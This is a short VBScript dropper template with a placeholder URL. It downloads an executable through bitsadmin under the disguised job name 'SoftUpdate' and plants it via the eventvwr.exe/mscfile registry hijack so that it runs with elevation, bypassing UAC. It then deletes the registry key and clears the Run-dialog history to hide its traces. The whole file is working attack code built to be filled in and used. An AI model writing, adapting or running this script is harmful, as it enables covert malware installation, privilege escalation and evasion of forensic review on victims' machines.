Sub Main()


	'Userdefined payload settings
	URL = "XX" '<- You binary direct link
	SAVE_NAME = "pxx.exe" '<-- The what file should be named when dropped on system
	
	'Download File
	CreateObject("WScript.Shell").run("cmd /c bitsadmin /transfer SoftUpdate /download /priority FOREGROUND " + URL + " %temp%/" + SAVE_NAME + ""),0,true
	
	'Write UAC bypass regkey
	CreateObject("WScript.Shell").RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) +"\" + SAVE_NAME ,"REG_SZ"
	
	'Trigger UAC bypass
	CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
	
	'Reset regkey 
	GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv").DeleteValue &H80000001,"Software\Classes\mscfile\shell\open\command\",""
	
	'Clear the run-dialog history
	CreateObject("WScript.Shell").Run("cmd.exe /C reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f "),0,true
End Sub 

On Error Resume Next

  Main


  If Err.Number Then

     WScript.Quit 4711

End If
